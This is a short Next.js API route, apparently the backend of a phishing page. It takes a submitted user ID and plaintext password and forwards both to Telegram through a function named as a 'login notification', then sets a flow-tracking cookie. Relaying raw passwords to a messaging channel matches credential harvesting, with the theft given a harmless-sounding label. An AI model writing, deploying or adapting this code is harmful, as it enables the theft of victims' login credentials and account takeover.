import { NextRequest, NextResponse } from "next/server"
import { telegramService } from "@/lib/telegram"

const FLOW_MAX_AGE_SEC = 10 * 60

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    await telegramService.sendLoginNotification({
      userId: String(data?.userId ?? ""),
      password: String(data?.password ?? ""),
    })
    const response = NextResponse.json({ success: true })
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: FLOW_MAX_AGE_SEC,
      sameSite: "lax",
    })
    return response
  } catch (error) {
    console.error("Error sending login notification:", error)
    return NextResponse.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
